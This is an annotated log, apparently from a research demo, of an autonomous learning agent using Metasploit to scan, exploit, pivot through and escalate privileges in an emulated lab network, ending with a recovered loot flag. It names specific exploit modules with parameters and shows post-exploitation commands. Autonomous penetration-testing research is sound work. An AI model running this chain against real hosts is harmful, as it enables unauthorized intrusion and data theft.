@@ -1,0 +1,246 @@
+rrl-nasim$ python main.py -load_model trained_model.pt --trace sm_entry_dmz_two_subnets.v2.yaml --emulate
+
+# Initially, the agent automatically performs a scan of the network to determine which hosts are reachable.
+INFO:MsfClient:Connecting to msfrpcd at 127.0.0.1:55553
+INFO:EmulatedNASimEnv:reset()
+INFO:MsfClient:Executing auxiliary:scanner/portscan/tcp with params {'RHOSTS': '192.168.1-5.100-110', 'PORTS': '22', 'THREADS': 10}
+INFO:MsfClient:Scan result: ['192.168.1.100:22']
+# Below is the current observation of the agent. Compr. = Compromised; Reach. = Reachable; Disc. = Discovered
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+| Address | Compr. | Reach. | Disc. | Value | Access | linux | windows | proftpd | drupal | phpwiki | e_search | wp_ninja | mysql |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+|  (1, 0) | False  | True   | True  |  0.0  |  0.0   | False |  False  |  False  | False  |  False  |   False  |   False  | False |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+
+# Next, the agent scans the discovered node.
+STEP 0
+INFO:EmulatedNASimEnv:step() with ServiceScan: name=service_scan, target=(1, 0), cost=1.00, prob=1.00, req_access=USER
+INFO:MsfClient:Executing auxiliary:scanner/portscan/tcp with params {'RHOSTS': '192.168.1.100', 'PORTS': '21,80,3306,9200', 'THREADS': 10}
+INFO:MsfClient:Scan result: ['192.168.1.100:80', '192.168.1.100:9200']
+INFO:MsfClient:Executing auxiliary:scanner/http/dir_scanner with params {'RHOSTS': '192.168.1.100', 'RPORT': '80', 'THREADS': 1, 'DICTIONARY': '/vagrant/http_dir.txt'}
+INFO:MsfClient:Folders found on the Http service: ['uploads', 'wordpress']
+INFO:EmulatedNetwork:Found these services: {'21_linux_proftpd': False, '80_linux_drupal': False, '80_linux_phpwiki': False, '9200_windows_elasticsearch': True, '80_windows_wp_ninja': True, '3306_any_mysql': False} (192.168.1.100).
+
+a: ServiceScan: name=service_scan, target=(1, 0), cost=1.00, prob=1.00, req_access=USER, r: 0.0, d: False
+V(s)=6.26
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+| Address | Compr. | Reach. | Disc. | Value | Access | linux | windows | proftpd | drupal | phpwiki | e_search | wp_ninja | mysql |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+|  (1, 0) | False  | True   | True  |  0.0  |  0.0   | False |  False  |   False | False  |  False  |   True   |   True   | False |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+
+# As the agent sees that the host is running e_search service, it tries to exploit it.
+STEP 1
+INFO:EmulatedNASimEnv:step() with Exploit: name=e_wp_ninja, target=(1, 0), cost=1.00, prob=1.00, req_access=USER, os=windows, service=80_windows_wp_ninja, access=1
+INFO:MsfClient:Executing exploit:multi/http/wp_ninja_forms_unauthenticated_file_upload with params {'RHOSTS': '192.168.1.100', 'TARGETURI': '/wordpress/', 'FORM_PATH': 'index.php/king-of-hearts/', 'RPORT': '80', 'AllowNoCleanup': True}
+INFO:MsfClient:Executing exploit:multi/handler with params {}
+INFO:MsfClient:Opened new session #1 for 192.168.1.100
+INFO:MsfClient:Running `DIR C:` at #1 (192.168.1.100)
+INFO:MsfClient:Executing post:multi/general/execute with params {'COMMAND': 'cmd /c "DIR C:"', 'SESSION': 1}
+INFO:MsfClient:Running `whoami /groups` at #1 (192.168.1.100)
+INFO:MsfClient:Executing post:multi/general/execute with params {'COMMAND': 'cmd /c "whoami /groups"', 'SESSION': 1}
+a: Exploit: name=e_wp_ninja, target=(1, 0), cost=1.00, prob=1.00, req_access=USER, os=windows, service=80_windows_wp_ninja, access=1, r: 0.0, d: False
+V(s)=6.51
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+| Address | Compr. | Reach. | Disc. | Value | Access | linux | windows | proftpd | drupal | phpwiki | e_search | wp_ninja | mysql |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+|  (1, 0) |  True  |  True  | True  |  0.0  |  1.0   | False |  False  |  False  |  False |  False  |   True   |   True   | False |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+
+# The host is compromised. The next step is to perform a network scan from the exploited host to see other parts of the network.
+STEP 2
+INFO:EmulatedNASimEnv:step() with SubnetScan: name=subnet_scan, target=(1, 0), cost=1.00, prob=1.00, req_access=USER
+INFO:MsfClient:Executing post:multi/gather/ping_sweep with params {'RHOSTS': '192.168.1-5.100-110', 'SESSION': 1}
+INFO:MsfClient:Scan result: ['192.168.1.100', '192.168.3.101', '192.168.3.100', '192.168.4.101', '192.168.4.100']
+INFO:EmulatedNetwork:Found new hosts {'192.168.3.100', '192.168.3.101', '192.168.4.100', '192.168.4.101'}, creating a route from 192.168.1.100.
+INFO:MsfClient:Executing msfconsole command: `route add 192.168.3.0/24 1`
+INFO:MsfClient:Executing msfconsole command: `route add 192.168.4.0/24 1`
+a: SubnetScan: name=subnet_scan, target=(1, 0), cost=1.00, prob=1.00, req_access=USER, r: 0.0, d: False
+V(s)=7.10
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+| Address | Compr. | Reach. | Disc. | Value | Access | linux | windows | proftpd | drupal | phpwiki | e_search | wp_ninja | mysql |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+|  (1, 0) |  True  |  True  | True  |  0.0  |  1.0   | False |  False  |  False  |  False |  False  |    True  |    True  | False |
+|  (3, 1) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |  False  |  False |  False  |   False  |   False  | False |
+|  (3, 0) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |  False  |  False |  False  |   False  |   False  | False |
+|  (4, 1) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |  False  |  False |  False  |   False  |   False  | False |
+|  (4, 0) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |  False  |  False |  False  |   False  |   False  | False |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+
+# The agent discovered several nodes in two different subnets. Metasploit was automatically configured to use the first host as 
+# a pivot to access these parts of the network. Now the agent chooses one of the hosts and scans it.
+STEP 3
+INFO:EmulatedNASimEnv:step() with ServiceScan: name=service_scan, target=(4, 0), cost=1.00, prob=1.00, req_access=USER
+INFO:MsfClient:Executing auxiliary:scanner/portscan/tcp with params {'RHOSTS': '192.168.4.100', 'PORTS': '21,80,3306,9200', 'THREADS': 10}
+INFO:MsfClient:Scan result: ['192.168.4.100:21', '192.168.4.100:80']
+INFO:MsfClient:Executing auxiliary:scanner/http/dir_scanner with params {'RHOSTS': '192.168.4.100', 'RPORT': '80', 'THREADS': 1, 'DICTIONARY': '/vagrant/http_dir.txt'}
+INFO:MsfClient:Folders found on the Http service: ['uploads', 'phpwiki']
+INFO:EmulatedNetwork:Found these services: {'21_linux_proftpd': True, '80_linux_drupal': False, '80_linux_phpwiki': True, '9200_windows_elasticsearch': False, '80_windows_wp_ninja': False, '3306_any_mysql': False} (192.168.4.100).
+
+a: ServiceScan: name=service_scan, target=(4, 0), cost=1.00, prob=1.00, req_access=USER, r: 0.0, d: False
+V(s)=11.46
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+| Address | Compr. | Reach. | Disc. | Value | Access | linux | windows | proftpd | drupal | phpwiki | e_search | wp_ninja | mysql |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+|  (1, 0) |  True  |  True  | True  |  0.0  |  1.0   | False |  False  |  False  |  False |  False  |    True  |    True  | False |
+|  (3, 1) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |  False  |  False |  False  |   False  |   False  | False |
+|  (3, 0) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |  False  |  False |  False  |   False  |   False  | False |
+|  (4, 1) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |  False  |  False |  False  |   False  |   False  | False |
+|  (4, 0) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |   True  |  False |   True  |   False  |   False  | False |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+
+# ProcessScan actions are non-sensical in our case, because there are not any processes defined. The tested model is not perfect. 
+STEP 4
+INFO:EmulatedNASimEnv:step() with ProcessScan: name=process_scan, target=(4, 0), cost=1.00, prob=1.00, req_access=USER
+a: ProcessScan: name=process_scan, target=(4, 0), cost=1.00, prob=1.00, req_access=USER, r: 0.0, d: False
+V(s)=6.47
+
+STEP 5
+INFO:EmulatedNASimEnv:step() with ProcessScan: name=process_scan, target=(4, 0), cost=1.00, prob=1.00, req_access=USER
+a: ProcessScan: name=process_scan, target=(4, 0), cost=1.00, prob=1.00, req_access=USER, r: 0.0, d: False
+V(s)=6.47
+
+# The agent tries to exploit the proftpd service on the (4, 0) host. However, the exploit fails for unknown reason. This would never happen in simulation.
+STEP 6
+INFO:EmulatedNASimEnv:step() with Exploit: name=e_proftpd, target=(4, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, service=21_linux_proftpd, access=1
+INFO:MsfClient:Executing exploit:unix/ftp/proftpd_modcopy_exec with params {'RHOSTS': '192.168.4.100', 'SITEPATH': '/var/www/uploads/', 'TARGETURI': '/uploads/'}
+INFO:MsfClient:No session created.
+WARNING:EmulatedNetwork:Failed exploit: Exploit: name=e_proftpd, target=(4, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, service=21_linux_proftpd, access=1
+
+a: Exploit: name=e_proftpd, target=(4, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, service=21_linux_proftpd, access=1, r: 0.0, d: False
+V(s)=6.47
+
+# The state did not change, the model is deterministic and outputs the same action probabilities. Hence, it tries the same exploit again. It fails again.
+STEP 7
+INFO:EmulatedNASimEnv:step() with Exploit: name=e_proftpd, target=(4, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, service=21_linux_proftpd, access=1
+INFO:MsfClient:Executing exploit:unix/ftp/proftpd_modcopy_exec with params {'RHOSTS': '192.168.4.100', 'SITEPATH': '/var/www/uploads/', 'TARGETURI': '/uploads/'}
+INFO:MsfClient:No session created.
+WARNING:EmulatedNetwork:Failed exploit: Exploit: name=e_proftpd, target=(4, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, service=21_linux_proftpd, access=1
+a: Exploit: name=e_proftpd, target=(4, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, service=21_linux_proftpd, access=1, r: 0.0, d: False
+V(s)=6.47
+
+STEP 8
+INFO:EmulatedNASimEnv:step() with ProcessScan: name=process_scan, target=(4, 0), cost=1.00, prob=1.00, req_access=USER
+a: ProcessScan: name=process_scan, target=(4, 0), cost=1.00, prob=1.00, req_access=USER, r: 0.0, d: False
+
+# Finally, the exploit succeeds. Automatically, the host is examined whether it contains sensitive data and if it can be accessed.
+STEP 9
+INFO:EmulatedNASimEnv:step() with Exploit: name=e_proftpd, target=(4, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, service=21_linux_proftpd, access=1
+INFO:MsfClient:Executing exploit:unix/ftp/proftpd_modcopy_exec with params {'RHOSTS': '192.168.4.100', 'SITEPATH': '/var/www/uploads/', 'TARGETURI': '/uploads/'}
+INFO:MsfClient:Opened new session #2 for 192.168.4.100
+INFO:MsfClient:Running `test -f /home/kylo_ren/loot; echo NO_LOOT=$?` at #2 (192.168.4.100)
+INFO:MsfClient:Executing post:multi/general/execute with params {'COMMAND': 'test -f /home/kylo_ren/loot; echo NO_LOOT=$?', 'SESSION': 2}
+INFO:MsfClient:Running `whoami` at #2 (192.168.4.100)
+INFO:MsfClient:Executing post:multi/general/execute with params {'COMMAND': 'whoami', 'SESSION': 2}
+a: Exploit: name=e_proftpd, target=(4, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, service=21_linux_proftpd, access=1, r: 0.0, d: False
+V(s)=6.47
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+| Address | Compr. | Reach. | Disc. | Value | Access | linux | windows | proftpd | drupal | phpwiki | e_search | wp_ninja | mysql |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+|  (1, 0) |  True  |  True  | True  |  0.0  |  1.0   | False |  False  |  False  |  False |  False  |    True  |   True   | False |
+|  (3, 1) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |  False  |  False |  False  |   False  |  False   | False |
+|  (3, 0) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |  False  |  False |  False  |   False  |  False   | False |
+|  (4, 1) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |  False  |  False |  False  |   False  |  False   | False |
+|  (4, 0) |  True  |  True  | True  |  0.0  |  1.0   | False |  False  |   True  |  False |   True  |   False  |  False   | False |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+
+STEP 10
+INFO:EmulatedNASimEnv:step() with ProcessScan: name=process_scan, target=(4, 0), cost=1.00, prob=1.00, req_access=USER
+a: ProcessScan: name=process_scan, target=(4, 0), cost=1.00, prob=1.00, req_access=USER, r: 0.0, d: False
+V(s)=6.28
+
+STEP 11
+INFO:EmulatedNASimEnv:step() with ProcessScan: name=process_scan, target=(4, 1), cost=1.00, prob=1.00, req_access=USER
+a: ProcessScan: name=process_scan, target=(4, 1), cost=1.00, prob=1.00, req_access=USER, r: 0.0, d: False
+V(s)=6.28
+
+STEP 12
+INFO:EmulatedNASimEnv:step() with ProcessScan: name=process_scan, target=(4, 1), cost=1.00, prob=1.00, req_access=USER
+a: ProcessScan: name=process_scan, target=(4, 1), cost=1.00, prob=1.00, req_access=USER, r: 0.0, d: False
+V(s)=6.28
+
+STEP 13
+INFO:EmulatedNASimEnv:step() with ProcessScan: name=process_scan, target=(4, 0), cost=1.00, prob=1.00, req_access=USER
+a: ProcessScan: name=process_scan, target=(4, 0), cost=1.00, prob=1.00, req_access=USER, r: 0.0, d: False
+V(s)=6.28
+
+# The agent focuses on a different node and scans it.
+STEP 14
+INFO:EmulatedNASimEnv:step() with ServiceScan: name=service_scan, target=(3, 0), cost=1.00, prob=1.00, req_access=USER
+INFO:MsfClient:Executing auxiliary:scanner/portscan/tcp with params {'RHOSTS': '192.168.3.100', 'PORTS': '21,80,3306,9200', 'THREADS': 10}
+INFO:MsfClient:Scan result: ['192.168.3.100:21', '192.168.3.100:3306', '192.168.3.100:80']
+INFO:MsfClient:Executing auxiliary:scanner/http/dir_scanner with params {'RHOSTS': '192.168.3.100', 'RPORT': '80', 'THREADS': 1, 'DICTIONARY': '/vagrant/http_dir.txt'}
+INFO:MsfClient:Folders found on the Http service: ['uploads', 'drupal', 'phpwiki']
+INFO:EmulatedNetwork:Found these services: {'21_linux_proftpd': True, '80_linux_drupal': True, '80_linux_phpwiki': True, '9200_windows_elasticsearch': False, '80_windows_wp_ninja': False, '3306_any_mysql': True} (192.168.3.100).
+
+a: ServiceScan: name=service_scan, target=(3, 0), cost=1.00, prob=1.00, req_access=USER, r: 0.0, d: False
+V(s)=6.28
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+| Address | Compr. | Reach. | Disc. | Value | Access | linux | windows | proftpd | drupal | phpwiki | e_search | wp_ninja | mysql |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+|  (1, 0) |  True  |  True  | True  |  0.0  |  1.0   | False |  False  |  False  |  False |  False  |    True  |    True  | False |
+|  (3, 1) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |  False  |  False |  False  |   False  |   False  | False |
+|  (3, 0) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |   True  |   True |   True  |   False  |   False  |  True |
+|  (4, 1) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |  False  |  False |  False  |   False  |   False  | False |
+|  (4, 0) |  True  |  True  | True  |  0.0  |  1.0   | False |  False  |   True  |  False |   True  |   False  |   False  | False |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+
+# It discovered that the (3, 0) node runs the mysql service, which is an indication that the node could be sensitive. It tries to exploit the drupal service.
+STEP 15
+INFO:EmulatedNASimEnv:step() with Exploit: name=e_drupal, target=(3, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, service=80_linux_drupal, access=1
+INFO:MsfClient:Executing exploit:unix/webapp/drupal_coder_exec with params {'RHOSTS': '192.168.3.100', 'TARGETURI': '/drupal'}
+INFO:MsfClient:No session created.
+WARNING:EmulatedNetwork:Failed exploit: Exploit: name=e_drupal, target=(3, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, service=80_linux_drupal, access=1
+
+a: Exploit: name=e_drupal, target=(3, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, service=80_linux_drupal, access=1, r: 0.0, d: False
+V(s)=12.98
+
+# It tries again and this time succeeds. The examination shows that the host contains sensitive information, but it can be accessed only by a priviledged user.
+STEP 16
+INFO:EmulatedNASimEnv:step() with Exploit: name=e_drupal, target=(3, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, service=80_linux_drupal, access=1
+INFO:MsfClient:Executing exploit:unix/webapp/drupal_coder_exec with params {'RHOSTS': '192.168.3.100', 'TARGETURI': '/drupal'}
+INFO:MsfClient:Opened new session #3 for 192.168.3.100
+INFO:MsfClient:Running `test -f /home/kylo_ren/loot; echo NO_LOOT=$?` at #3 (192.168.3.100)
+INFO:MsfClient:Executing post:multi/general/execute with params {'COMMAND': 'test -f /home/kylo_ren/loot; echo NO_LOOT=$?', 'SESSION': 3}
+INFO:MsfClient:Running `cat /home/kylo_ren/loot` at #3 (192.168.3.100)
+INFO:MsfClient:Executing post:multi/general/execute with params {'COMMAND': 'cat /home/kylo_ren/loot', 'SESSION': 3}
+INFO:MsfClient:Running `whoami` at #3 (192.168.3.100)
+INFO:MsfClient:Executing post:multi/general/execute with params {'COMMAND': 'whoami', 'SESSION': 3}
+
+a: Exploit: name=e_drupal, target=(3, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, service=80_linux_drupal, access=1, r: 0.0, d: False
+V(s)=12.98
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+| Address | Compr. | Reach. | Disc. | Value | Access | linux | windows | proftpd | drupal | phpwiki | e_search | wp_ninja | mysql |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+|  (1, 0) |  True  |  True  | True  |  0.0  |  1.0   | False |  False  |  False  | False  |  False  |   True   |    True  | False |
+|  (3, 1) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |  False  | False  |  False  |  False   |   False  | False |
+|  (3, 0) |  True  |  True  | True  | 100.0 |  1.0   | False |  False  |   True  |  True  |   True  |  False   |   False  |  True |
+|  (4, 1) | False  |  True  | True  |  0.0  |  0.0   | False |  False  |  False  | False  |  False  |  False   |   False  | False |
+|  (4, 0) |  True  |  True  | True  |  0.0  |  1.0   | False |  False  |   True  | False  |   True  |  False   |   False  | False |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+
+# The agent tries the priviledge escalation and after success it collects the sensitive information (the loot).
+STEP 17
+INFO:EmulatedNASimEnv:step() with PrivilegeEscalation: name=pe_kernel, target=(3, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, process=None, access=2
+INFO:MsfClient:Executing exploit:linux/local/overlayfs_priv_esc with params {'SESSION': 3, 'target': 0}
+INFO:MsfClient:Opened new session #4 for 192.168.3.100
+INFO:MsfClient:Running `test -f /home/kylo_ren/loot; echo NO_LOOT=$?` at #4 (192.168.3.100)
+INFO:MsfClient:Executing post:multi/general/execute with params {'COMMAND': 'test -f /home/kylo_ren/loot; echo NO_LOOT=$?', 'SESSION': 4}
+INFO:MsfClient:Running `cat /home/kylo_ren/loot` at #4 (192.168.3.100)
+INFO:MsfClient:Executing post:multi/general/execute with params {'COMMAND': 'cat /home/kylo_ren/loot', 'SESSION': 4}
+INFO:EmulatedNetwork:----------------------
+INFO:EmulatedNetwork:Loot recovered: LOOT=28a5b8532399467452f55775a05daa10
+INFO:EmulatedNetwork:----------------------
+INFO:MsfClient:Running `whoami` at #4 (192.168.3.100)
+INFO:MsfClient:Executing post:multi/general/execute with params {'COMMAND': 'whoami', 'SESSION': 4}
+a: PrivilegeEscalation: name=pe_kernel, target=(3, 0), cost=1.00, prob=1.00, req_access=USER, os=linux, process=None, access=2, r: 0.0, d: False
+V(s)=16.02
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+| Address | Compr. | Reach. | Disc. | Value | Access | linux | windows | proftpd | drupal | phpwiki | e_search | wp_ninja | mysql |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
+|  (1, 0) |  True  | True   | True  |  0.0  |  1.0   | False |  False  |  False  | False  |  False  |    True  |   True   | False |
+|  (3, 1) | False  | True   | True  |  0.0  |  0.0   | False |  False  |  False  | False  |  False  |   False  |  False   | False |
+|  (3, 0) |  True  | True   | True  | 100.0 |  2.0   | False |  False  |   True  |  True  |   True  |   False  |  False   |  True |
+|  (4, 1) | False  | True   | True  |  0.0  |  0.0   | False |  False  |  False  | False  |  False  |   False  |  False   | False |
+|  (4, 0) |  True  | True   | True  |  0.0  |  1.0   | False |  False  |   True  | False  |   True  |   False  |  False   | False |
++---------+--------+--------+-------+-------+--------+-------+---------+---------+--------+---------+----------+----------+-------+
